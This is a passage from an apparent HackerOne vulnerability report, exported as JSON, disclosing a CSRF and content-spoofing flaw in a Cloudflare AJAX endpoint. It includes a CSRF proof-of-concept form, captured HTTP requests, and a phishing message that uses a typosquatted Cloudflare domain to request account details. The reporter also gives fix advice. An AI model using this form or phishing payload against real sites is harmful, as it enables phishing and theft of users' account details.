{"id":8806,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODA2","url":"https://hackerone.com/reports/8806","title":"Content spoofing /CSRF at https://www.cloudflare.com/ajax/modal-dialog.html","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-04-21T19:45:54.373Z","submitted_at":"2014-04-21T19:45:54.373Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"internetwache","url":"/internetwache","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41,"url":"https://hackerone.com/cloudflare","handle":"cloudflare","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Cloudflare Vulnerability Disclosure","twitter_handle":"cloudflare","website":"https://www.cloudflare.com/disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-07-08T10:00:22.927Z","bug_reporter_agreed_on_going_public_at":"2014-06-07T18:24:18.356Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there,\r\n\r\nI noticed two things on the following url: https://www.cloudflare.com/ajax/modal-dialog.html\r\n\r\n##1. CSRF\r\nThere are some csrf countermeasures in place (e.g. X-Requested-With: XMLHttpRequest), however they're not validated on the server. \r\n\r\nThis leads to an uncritical csrf:\r\n\r\n```\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"https://www.cloudflare.com/ajax/modal-dialog.html\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"type\" value=\"default\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"content\" value=\"This\u0026#32;is\u0026#32;my\u0026#32;content\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\n##2. Content spoofing\r\nUsing 1.) I can send some abitary content within the ```content``` parameter to my victim. \r\n\r\nThe ```Content-Type``` is ```text/html```, however I was not able to break the filter and conduct a xss at the first glance.\r\n\r\nAs said, I could send an abitary message fomatted with new-lines to my victim telling him to send over some details or something (be creative here :) ). That would result in a (lame) phishing attack.\r\n\r\n#What should you fix?\r\n - Set a better Content-Type. E.g. \"text/plain\" \r\n- Validate the CSRF headers\r\n- Do not send the displayed error message in the request. (e.g. hardcode those message and pass an ID depending on the situation).\r\n\r\nLet me know, what you think about this.\r\n\r\nThanks,\r\nSebastian","vulnerability_information_html":"\u003cp\u003eHi there,\u003c/p\u003e\n\n\u003cp\u003eI noticed two things on the following url: \u003ca title=\"https://www.cloudflare.com/ajax/modal-dialog.html\" href=\"/redirect?url=https%3A%2F%2Fwww.cloudflare.com%2Fajax%2Fmodal-dialog.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.cloudflare.com/ajax/modal-dialog.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"1-csrf\"\u003e1. CSRF\u003c/h2\u003e\n\n\u003cp\u003eThere are some csrf countermeasures in place (e.g. X-Requested-With: XMLHttpRequest), however they\u0026#39;re not validated on the server. \u003c/p\u003e\n\n\u003cp\u003eThis leads to an uncritical csrf:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.cloudflare.com/ajax/modal-dialog.html\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;type\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;default\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;content\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;This\u0026amp;#32;is\u0026amp;#32;my\u0026amp;#32;content\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"2-content-spoofing\"\u003e2. Content spoofing\u003c/h2\u003e\n\n\u003cp\u003eUsing 1.) I can send some abitary content within the \u003ccode\u003econtent\u003c/code\u003e parameter to my victim. \u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003eContent-Type\u003c/code\u003e is \u003ccode\u003etext/html\u003c/code\u003e, however I was not able to break the filter and conduct a xss at the first glance.\u003c/p\u003e\n\n\u003cp\u003eAs said, I could send an abitary message fomatted with new-lines to my victim telling him to send over some details or something (be creative here :) ). That would result in a (lame) phishing attack.\u003c/p\u003e\n\n\u003ch1 id=\"what-should-you-fix\"\u003eWhat should you fix?\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eSet a better Content-Type. E.g. \u0026quot;text/plain\u0026quot; \n\n\u003cul\u003e\n\u003cli\u003eValidate the CSRF headers\u003c/li\u003e\n\u003cli\u003eDo not send the displayed error message in the request. (e.g. hardcode those message and pass an ID depending on the situation).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eLet me know, what you think about this.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-07-03T05:35:35.383Z","allow_singular_disclosure_after":-204859780.86897427,"singular_disclosure_allowed":true,"vote_count":2,"voters":["sw33tlie","muhaddix"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":38848,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Automated vulnerability scanners commonly have low priority issues and/or false positives. Before submitting the results from a scanner, please take a moment to confirm that the reported issues are actually valid and exploitable. Please reply if you have a working proof-of-concept or reason to believe that this issue is exploitable.","markdown_message":"\u003cp\u003eAutomated vulnerability scanners commonly have low priority issues and/or false positives. Before submitting the results from a scanner, please take a moment to confirm that the reported issues are actually valid and exploitable. Please reply if you have a working proof-of-concept or reason to believe that this issue is exploitable.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-25T20:43:57.954Z","updated_at":"2014-04-25T20:43:57.954Z","actor":{"username":"jamie","cleared":false,"url":"/jamie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/767/528e88f7a06a6bbbae2b2b37dbb7649c9486c404_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":38927,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @jamie,\nI'm a bit impressed that you consider my submission the result of automated scanning. Seems like I'm working like a machine lol.\n\nReading through my report, I'm not sure if I got to the right point/conclusions or if failed at explaining them properly.\n\nI'm going to write a more detailed/throughout report tomorrow.\n\nSorry for any incovenience,\nSebastian\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jamie\"\u003e@jamie\u003c/a\u003e,\u003cbr\u003e\nI\u0026#39;m a bit impressed that you consider my submission the result of automated scanning. Seems like I\u0026#39;m working like a machine lol.\u003c/p\u003e\n\n\u003cp\u003eReading through my report, I\u0026#39;m not sure if I got to the right point/conclusions or if failed at explaining them properly.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m going to write a more detailed/throughout report tomorrow.\u003c/p\u003e\n\n\u003cp\u003eSorry for any incovenience,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-26T00:53:44.474Z","updated_at":"2014-04-26T00:53:44.474Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":39344,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay,\nI'm going to write the report with some more details again.\nPlease let me know, which part of it seems to be \"automated\". (I'm curious)\n\nI'm going to write down the whole process and some thoughts.\n\n- 1. First, we create a new cloudflare testing account. Nothing special should happen here.\n- 2. Before we continue with the login, we start up burp and configure the browser to route all traffic through it.\n- 3. After successfully logging in, we add a new domain. \n- 4. Now we're going to select the \"Pause cloudflare\" option in the menu of the freshly created domain.\nWe monitor the following HTTP request in burp:\n\n```\nPOST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\nContent-Length: 249\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default\u0026content=Pause+will+temporarily+deactivate+CloudFlare+for+your+website.+Your+website+will+continue+to+be+online%2C+but+it+will+not+receive+the+performance+and+security+benefits+of+CloudFlare.+Are+you+sure+you+want+to+pause+the+service%3F\n``` \nThe response looks like this:\n```\nHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:39:13 GMT\nContent-Type: text/html\nConnection: keep-alive\nX-Frame-Options: DENY\nVary: Accept-Encoding\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nSet-Cookie: vses2=mi09p521jhp6ps1ud4lg7pi6e4; path=/; domain=www.cloudflare.com; secure; HttpOnly\nCf-Railgun: 06c91e3042 0010 normal c17d\nCF-RAY: 12153ebea1d800e1-AMS\nContent-Length: 2157\n\n \u003cdiv id=\"ModalComponent\"\u003e\n\u003cdiv id=\"ModalDialog\" class=\"standard modal\"\u003e\n\u003cdiv class=\"section\"\u003e\n\u003cdiv class=\"article\"\u003e\nPause will temporarily deactivate CloudFlare for your website. Your website will continue to be online, but it will not receive the performance and security benefits of CloudFlare. Are you sure you want to pause the service? \u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cscript type=\"text/javascript\"\u003e[snip...js stuff....snip]\u003c/script\u003e\n\u003c/div\u003e\n\n```\n\nOh, what can we observer here? The content (```content``` parameter) from the request is embedded in the response.\nSo let's try to conduct some kind of XSS. Adding some ```\u003ch1\u003efoobar\u003c/h1\u003e``` stuff to the parameter results in the same response. No luck with that :(. After some more investigation, we know that everything after a ```\u003c``` is removed. \nAs far as I know, you can't write any HTML without this special character. \n\nHowever, we are still able to write whatever we want.  Let's try it: (set the ```content``` parameter as following and resend the above mentioned request)\n\n```\ntype=default\u0026content=Hello+cloudlare+user,%0AWe've+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n```\nAs expected, we'll get the same text in the response:\n\n```\n\u003cdiv class=\"article\"\u003e\nHello cloudlare user,\nWe've detected a problem with your account.\nPlease send us your account details to support @ cloudfllare.com.\nThanks,\nThe clouddlare support team. \u003c/div\u003e\n\u003c/div\u003e\n```\nBeing able to add some foreign content to a AJAX request isn't a security issue by design.\nSo, what next? Taking a look at the ```Content-Type```-Header from the response, we'll see that it's ```text/html```.\n\n```\nHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:07:25 GMT\nContent-Type: text/html\n```\n\nGreat! That way the users browser would interpret the HTML sourcecode of the response and display our message. Otherwise the browsers would display the content as text and the user would see the whole soure code.\n\nNow we need to find a way to display our abitary content to our victim. Some kind of CSRF would be useful for that. \n\nThe HTTP-Request method is ```POST```.  So we'll need a form to submit our payload. \n\nTaking a second look at the HTTP-request we notice some important/optional headers:\n\n```\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\n```\n\nAs we know, we can't send abitary X-headers using HTML forms. So let's check whether this is used as a CSRF protection by removing the ```Referer``` and the ```X-Requested-WIth``` header and by adjusting the ```Content-Type``` to the following:\n\n```\nContent-Type: application/x-www-form-urlencoded\n```\n\nThe new request should look like this:\n\n```\nPOST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default\u0026content=Hello+cloudlare+user,%0AWe've+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n```\nResubmitting this request through burp gives us the exact result. Seems like there is no CSRF protection in place. Note the double ```l``` in the domain.\n\nLet's create our CSRF PoC:\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.cloudflare.com/ajax/modal-dialog.html\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"type\" value=\"default\" /\u003e\n      \u003cinput type=\"hidden\" name=\"content\" value=\"Hello\u0026#32;cloudlare\u0026#32;user\u0026#44;\u0026#10;We\u0026apos;ve\u0026#32;detected\u0026#32;a\u0026#32;problem\u0026#32;with\u0026#32;your\u0026#32;account\u0026#46;\u0026#10;Please\u0026#32;send\u0026#32;us\u0026#32;your\u0026#32;account\u0026#32;details\u0026#32;to\u0026#32;support\u0026#32;\u0026#64;\u0026#32;cloudfllare\u0026#46;com\u0026#46;\u0026#10;\u0026#10;Thanks\u0026#44;\u0026#10;The\u0026#32;clouddlare\u0026#32;support\u0026#32;team\u0026#46;\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nLet's save it as ```/tmp/csrf.html``` and open it in a new tab: ```firefox /tmp/csrf.html```\n\nThis should look like \"cloudflare_poc_1.png\". The submit button is just for testing purposes. Normally an attacker would fire the form automatically when visiting the exploit.\n\nThe final result should look like this. \"cloudflare_poc_2.png\".\n\nAs you can see, we can display abitary content on the cloudflare website for every authenticated user. This could be used for some kind of phishing.\nIt's a very low critical issue, though.\n\n##How to fix:\nAs mentioned  in my original post, there are some ways to fix this problem:\n\n- Implement a CSRF protection or validate the X-Requested-With header. This way, I can't send my abitary content to my victim.\n- Hardcode the embedded response and send a ```content_id``` parameter which will then display the correct message. This way I can't change the content of the response.\n- Set a proper ```Content-Type```. As the content will be embedded into the requesting website by some javascript, you could change the ```Content-Type``` of the response to ```text/plain```. This way my victim would see the whole HTML sourcecode. Nobody would follow the instructions anymore.\n\nI hope that helps,\nSebastian","markdown_message":"\u003cp\u003eOkay,\u003cbr\u003e\nI\u0026#39;m going to write the report with some more details again.\u003cbr\u003e\nPlease let me know, which part of it seems to be \u0026quot;automated\u0026quot;. (I\u0026#39;m curious)\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m going to write down the whole process and some thoughts.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e1. First, we create a new cloudflare testing account. Nothing special should happen here.\u003c/li\u003e\n\u003cli\u003e2. Before we continue with the login, we start up burp and configure the browser to route all traffic through it.\u003c/li\u003e\n\u003cli\u003e3. After successfully logging in, we add a new domain. \u003c/li\u003e\n\u003cli\u003e4. Now we\u0026#39;re going to select the \u0026quot;Pause cloudflare\u0026quot; option in the menu of the freshly created domain.\nWe monitor the following HTTP request in burp:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\nContent-Length: 249\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default\u0026amp;content=Pause+will+temporarily+deactivate+CloudFlare+for+your+website.+Your+website+will+continue+to+be+online%2C+but+it+will+not+receive+the+performance+and+security+benefits+of+CloudFlare.+Are+you+sure+you+want+to+pause+the+service%3F\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe response looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:39:13 GMT\nContent-Type: text/html\nConnection: keep-alive\nX-Frame-Options: DENY\nVary: Accept-Encoding\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nSet-Cookie: vses2=mi09p521jhp6ps1ud4lg7pi6e4; path=/; domain=www.cloudflare.com; secure; HttpOnly\nCf-Railgun: 06c91e3042 0010 normal c17d\nCF-RAY: 12153ebea1d800e1-AMS\nContent-Length: 2157\n\n \u0026lt;div id=\u0026quot;ModalComponent\u0026quot;\u0026gt;\n\u0026lt;div id=\u0026quot;ModalDialog\u0026quot; class=\u0026quot;standard modal\u0026quot;\u0026gt;\n\u0026lt;div class=\u0026quot;section\u0026quot;\u0026gt;\n\u0026lt;div class=\u0026quot;article\u0026quot;\u0026gt;\nPause will temporarily deactivate CloudFlare for your website. Your website will continue to be online, but it will not receive the performance and security benefits of CloudFlare. Are you sure you want to pause the service? \u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;[snip...js stuff....snip]\u0026lt;/script\u0026gt;\n\u0026lt;/div\u0026gt;\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOh, what can we observer here? The content (\u003ccode\u003econtent\u003c/code\u003e parameter) from the request is embedded in the response.\u003cbr\u003e\nSo let\u0026#39;s try to conduct some kind of XSS. Adding some \u003ccode\u003e\u0026lt;h1\u0026gt;foobar\u0026lt;/h1\u0026gt;\u003c/code\u003e stuff to the parameter results in the same response. No luck with that :(. After some more investigation, we know that everything after a \u003ccode\u003e\u0026lt;\u003c/code\u003e is removed. \u003cbr\u003e\nAs far as I know, you can\u0026#39;t write any HTML without this special character. \u003c/p\u003e\n\n\u003cp\u003eHowever, we are still able to write whatever we want.  Let\u0026#39;s try it: (set the \u003ccode\u003econtent\u003c/code\u003e parameter as following and resend the above mentioned request)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etype=default\u0026amp;content=Hello+cloudlare+user,%0AWe\u0026#39;ve+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs expected, we\u0026#39;ll get the same text in the response:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;div class=\u0026quot;article\u0026quot;\u0026gt;\nHello cloudlare user,\nWe\u0026#39;ve detected a problem with your account.\nPlease send us your account details to support @ cloudfllare.com.\nThanks,\nThe clouddlare support team. \u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBeing able to add some foreign content to a AJAX request isn\u0026#39;t a security issue by design.\u003cbr\u003e\nSo, what next? Taking a look at the \u003ccode\u003eContent-Type\u003c/code\u003e-Header from the response, we\u0026#39;ll see that it\u0026#39;s \u003ccode\u003etext/html\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:07:25 GMT\nContent-Type: text/html\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGreat! That way the users browser would interpret the HTML sourcecode of the response and display our message. Otherwise the browsers would display the content as text and the user would see the whole soure code.\u003c/p\u003e\n\n\u003cp\u003eNow we need to find a way to display our abitary content to our victim. Some kind of CSRF would be useful for that. \u003c/p\u003e\n\n\u003cp\u003eThe HTTP-Request method is \u003ccode\u003ePOST\u003c/code\u003e.  So we\u0026#39;ll need a form to submit our payload. \u003c/p\u003e\n\n\u003cp\u003eTaking a second look at the HTTP-request we notice some important/optional headers:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs we know, we can\u0026#39;t send abitary X-headers using HTML forms. So let\u0026#39;s check whether this is used as a CSRF protection by removing the \u003ccode\u003eReferer\u003c/code\u003e and the \u003ccode\u003eX-Requested-WIth\u003c/code\u003e header and by adjusting the \u003ccode\u003eContent-Type\u003c/code\u003e to the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eContent-Type: application/x-www-form-urlencoded\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe new request should look like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default\u0026amp;content=Hello+cloudlare+user,%0AWe\u0026#39;ve+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResubmitting this request through burp gives us the exact result. Seems like there is no CSRF protection in place. Note the double \u003ccode\u003el\u003c/code\u003e in the domain.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s create our CSRF PoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.cloudflare.com/ajax/modal-dialog.html\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;type\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;default\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;content\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan 